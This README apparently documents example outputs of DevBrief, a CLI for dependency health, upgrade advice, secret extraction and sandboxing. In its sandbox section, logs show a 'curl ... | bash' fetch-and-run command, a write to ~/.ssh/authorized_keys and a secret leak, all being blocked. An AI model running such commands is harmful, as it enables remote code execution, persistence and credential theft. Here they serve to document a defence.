# DevBrief Command Outputs Examples

These examples demonstrate the primary CLI outputs from the DevBrief Project Maintenance Intelligence engine, generated from the actual project code and included test fixtures.

---

## 1. Flagship scan (`devbrief doctor`)

Running a scan in a standard repository:

```bash
npx devbrief doctor --path examples/fixtures/npm-app
```

```text
EOL: Node 18 is past EOL (2025-04-30)
Health: 38/100
Breakdown:
  Runtime Lifecycle:   0/25
  Dependency Risk:     9/25
  Infrastructure:      25/25
  Security & Services: 4/25

Detected: JavaScript/TypeScript (Express)
Package manager: npm
Scanned: 3 files, 3 dependencies, 1 runtime, 0 infra, 0 config/security, 0 service signals

EOL: Node 18 is past EOL (2025-04-30)  [package.json]
  Evidence: smallest safe path: Node 22 or 24 or 26 LTS
  Decision: upgrade, 1 hour+, confidence: High
  Why this matters: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).

REVIEW: Express app has no helmet dependency  [package.json]
  Evidence: add security headers if this serves public HTTP traffic
  Decision: review, 5 min, confidence: Medium
  Why this matters: Weak security postures leave your endpoints vulnerable to scanning bots and automated attacks.

REVIEW: better-sqlite3 may need rebuilds on Node upgrades  [package.json]
  Decision: review, 20 min, confidence: High
  Why this matters: Drift in runtime versions between development and production can cause silent runtime crashes.

REVIEW: Package "better-sqlite3" is declared in manifests but never imported in code  [package.json]
  Evidence: safe to remove if not used for tooling or dynamic/peer loading
  Decision: review, 5 min, confidence: High
  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.

Ignored: 7 low-signal items hidden by default
Next: upgrade - Node 18 is past EOL (2025-04-30) (1 hour+)
```

---

## 2. Monorepo Breakdown Output

When DevBrief detects multiple project manifests (e.g. Turborepo, pnpm workspaces, sub-packages), it automatically prints sub-project health scores and directory breakdowns:

```bash
npx devbrief doctor --path examples/fixtures/monorepo
```

```text
EOL: Node 20 is past EOL (2026-04-30)
Health: 0/100
Breakdown:
  Runtime Lifecycle:   0/25
  Dependency Risk:     0/25
  Infrastructure:      0/25
  Security & Services: 0/25

Project Health Breakdown:
  root             50/100
  apps/api         100/100
  apps/web         100/100
  infra            50/100

Detected: JavaScript/TypeScript, Python, Container/Infra (Next.js, React, Python project, Containerized app)
Package manager: pnpm, pip-compatible
Project roots: ., apps/api, apps/web, infra
Scanned: 5 files, 4 dependencies, 1 runtime, 1 infra, 0 config/security, 0 service signals

EOL: Node 20 is past EOL (2026-04-30)  [infra/Dockerfile]
  Evidence: smallest safe path: Node 22 or 24 or 26 LTS
  Decision: upgrade, 1 hour+, confidence: High
  Why this matters: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).

EOL: Docker image pins an EOL or recently EOL Node runtime  [infra/Dockerfile]
  Evidence: use a supported LTS image and test native dependencies
  Decision: upgrade, 20 min, confidence: High
  Why this matters: Drift in runner configurations or container engines leads to "works on my machine" deployment bugs.

RISKY: Recently published package: fastapi  [package.json]
  Evidence: published within the last 30 days (5/23/2026)
  Decision: review, 20 min, confidence: High
  Why this matters: Recently published packages have higher security risk as they have not been vetted by the community and are common targets for malware distribution.

REVIEW: Package "fastapi" is declared in manifests but never imported in code  [package.json]
  Evidence: safe to remove if not used for tooling or dynamic/peer loading
  Decision: review, 5 min, confidence: High
  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.

REVIEW: Package "next" is declared in manifests but never imported in code  [package.json]
  Evidence: safe to remove if not used for tooling or dynamic/peer loading
  Decision: review, 5 min, confidence: High
  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.

REVIEW: Package "react" is declared in manifests but never imported in code  [package.json]
  Evidence: safe to remove if not used for tooling or dynamic/peer loading
  Decision: review, 5 min, confidence: High
  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.

Ignored: 9 low-signal items hidden by default
Next: upgrade - Node 20 is past EOL (2026-04-30) (1 hour+)
```

---

## 3. Package Upgrade Advisor (`devbrief upgrade`)

Checking whether upgrading a dependency is safe by analyzing source code imports and version differentials:

```bash
npx devbrief upgrade express --target 5.0.0 --path examples/fixtures/npm-app
```

```text
UPGRADE WITH REVIEW: express
Installed: 4.18.2
Target: 5.0.0
Effort: 20 min

RISKY: express 4.18.2 -> 5.0.0 crosses a major version  [src/server.ts]
  Evidence: touches code you actually use in 1 file
  Decision: review, 20 min, confidence: High
  Why this matters: Major version updates cross breaking-change boundaries, meaning they change APIs and require code updates.
```

---

## 4. Inbox (`devbrief inbox`)

Surf only the urgent items and quick safe wins:

```bash
npx devbrief inbox --path examples/fixtures/npm-app
```

```text
EOL: Node 18 is past EOL (2025-04-30)
Health: 38/100
Breakdown:
  Runtime Lifecycle:   0/25
  Dependency Risk:     9/25
  Infrastructure:      25/25
  Security & Services: 4/25

Detected: JavaScript/TypeScript (Express)
Package manager: npm
Scanned: 3 files, 3 dependencies, 1 runtime, 0 infra, 0 config/security, 0 service signals

Urgent:
EOL: Node 18 is past EOL (2025-04-30)  [package.json]
  Evidence: smallest safe path: Node 22 or 24 or 26 LTS
  Decision: upgrade, 1 hour+, confidence: High
  Why this matters: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).

Safe wins:
REVIEW: Express app has no helmet dependency  [package.json]
  Evidence: add security headers if this serves public HTTP traffic
  Decision: review, 5 min, confidence: Medium
  Why this matters: Weak security postures leave your endpoints vulnerable to scanning bots and automated attacks.

REVIEW: Package "better-sqlite3" is declared in manifests but never imported in code  [package.json]
  Evidence: safe to remove if not used for tooling or dynamic/peer loading
  Decision: review, 5 min, confidence: High
  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.

Ignored: 7 low-signal items hidden by default
Next: upgrade - Node 18 is past EOL (2025-04-30) (1 hour+)
```

---

## 5. Upgrades & Fixes (`devbrief fix`)

### Interactive CLI Menu (TTY Environments)

If run in an interactive terminal, `devbrief fix` opens a selection dashboard using raw-mode TTY inputs:

```bash
npx devbrief fix
```

```text
? Select fixes to apply (Space to toggle, Enter to confirm):
❯ [x] Upgrade lodash - lodash has a known vulnerability (5 min, Confidence: High)
  [x] Upgrade serde - serde has EOL warnings (5 min, Confidence: High)
  [ ] Remediate wildcard CORS - CORS config wildcard review (20 min, Confidence: Medium)
```

### Headless Mode (`devbrief fix --safe-only`)

For non-TTY environments (like CI/CD pipelines) or automatic scripts, this applies low-risk, high-confidence upgrades:

```bash
npx devbrief fix --safe-only
```

```text
Upgrading package: lodash using npm in .
added 1 package in 1s
Upgrading package: axios using pnpm in apps/web
added 1 package in 1s

SUCCESS: Processed 2 safe fixes.
Modified packages: lodash (npm), axios (pnpm)
Files changed: package.json, apps/web/package.json
```

---

## 6. CI/CD Collapsible Summary (`--format markdown`)

Generating structured markdown summaries for CI/CD platforms (e.g. GitHub Actions summaries):

```bash
npx devbrief doctor --format markdown --path examples/fixtures/npm-app
```

```markdown
# DevBrief Project Maintenance Report

**Summary:** EOL: Node 18 is past EOL (2025-04-30)
**Health Score:** 38/100

| Category | Score |
| --- | --- |
| **Runtime Lifecycle** | 0/25 |
| **Dependency Risk** | 9/25 |
| **Infrastructure** | 25/25 |
| **Security & Services** | 4/25 |

## Findings

### :warning: **EOL**: Node 18 is past EOL (2025-04-30) (`package.json`)

<details>
<summary>View details</summary>

- **Verdict / Action**: upgrade
- **Effort**: 1 hour+
- **Confidence**: High
- **Evidence**: smallest safe path: Node 22 or 24 or 26 LTS
- **Why this matters**: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).

</details>

### :warning: **REVIEW**: Express app has no helmet dependency (`package.json`)

<details>
<summary>View details</summary>

- **Verdict / Action**: review
- **Effort**: 5 min
- **Confidence**: Medium
- **Evidence**: add security headers if this serves public HTTP traffic
- **Why this matters**: Weak security postures leave your endpoints vulnerable to scanning bots and automated attacks.

</details>

### :warning: **REVIEW**: better-sqlite3 may need rebuilds on Node upgrades (`package.json`)

<details>
<summary>View details</summary>

- **Verdict / Action**: review
- **Effort**: 20 min
- **Confidence**: High
- **Why this matters**: Drift in runtime versions between development and production can cause silent runtime crashes.

</details>

### :warning: **REVIEW**: Package "better-sqlite3" is declared in manifests but never imported in code (`package.json`)

<details>
<summary>View details</summary>

- **Verdict / Action**: review
- **Effort**: 5 min
- **Confidence**: High
- **Evidence**: safe to remove if not used for tooling or dynamic/peer loading
- **Why this matters**: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.

</details>


---
*Generated by DevBrief Project Maintenance Intelligence.*
```

---

## 7. Secrets Extraction (`devbrief clean-secrets`)

Extracting hardcoded API keys and credentials into a local `.env` file and replacing references automatically:

```bash
npx devbrief clean-secrets
```

```text
SAFE: No hardcoded secrets or AI placeholders found to refactor.
```

If secrets are found, they are extracted and replaced:

```text
Scanning codebase for hardcoded secrets...
Found: OpenAI API Key in src/config.ts
Found: AWS Access Key ID in src/aws-client.ts

Actions:
  ✓ Extracted secrets to .env
  ✓ Replaced raw string in src/config.ts with process.env.OPENAI_API_KEY
  ✓ Replaced raw string in src/aws-client.ts with process.env.AWS_ACCESS_KEY_ID

SUCCESS: Extracted 2 secrets and updated references.
```

---

## 8. Vibe Shield Sandbox (`devbrief shield -- <cmd>`)

Conforming runtimes to sandbox execution limits:

```bash
npx devbrief shield -- node app.js
```

### Example: Filesystem write outside workspace blocked

```text
⚠️  [DevBrief Vibe Shield] BLOCKED: fs.writeFileSync - /Users/HP/.ssh/authorized_keys
Error: Permission Denied by Vibe Shield: fs.writeFileSync to /Users/HP/.ssh/authorized_keys
```

### Example: Outbound secret leak blocked

```text
⚠️  [DevBrief Vibe Shield] BLOCKED: Secrets leak detected in HTTP request to logger.external-metrics.com for OPENAI_API_KEY
Error: Connection Blocked by Vibe Shield: Secret Exfiltration Detected
```

### Example: Command injection blocked

```text
⚠️  [DevBrief Vibe Shield] BLOCKED: child_process.spawn - curl -s http://malicious.org/payload.sh | bash
Error: Permission Denied: command injection/unsafe command blocked by Vibe Shield
```

---

## 9. Custom Scanner Plugins

You can extend DevBrief by writing custom scanner scripts and placing them in `.devbrief/plugins/` (local to project) or `~/.devbrief/plugins/` (global to your machine).

A plugin module must export a scanner object conforming to the `Scanner` interface:

```javascript
// .devbrief/plugins/custom-linter.js
export const scanner = {
  name: 'custom-linter',
  categories: ['security', 'doctor'], // CLI category commands that invoke this plugin
  async scan(context) {
    const findings = [];
    
    // Check if configuration matches
    const hasConfigFile = context.files.some(f => f.endsWith('lint-config.json'));
    if (!hasConfigFile) {
      findings.push({
        id: 'security:linter:missing-config',
        category: 'security',
        label: 'REVIEW',
        title: 'Missing lint configuration',
        summary: 'No lint-config.json was found in the workspace',
        evidence: 'Checked workspace directory tree',
        recommendation: 'remediate',
        urgency: 4,
        impact: 4,
        confidence: 10,
        effort: '5 min'
      });
    }
    
    return findings;
  }
};

export default scanner;
```
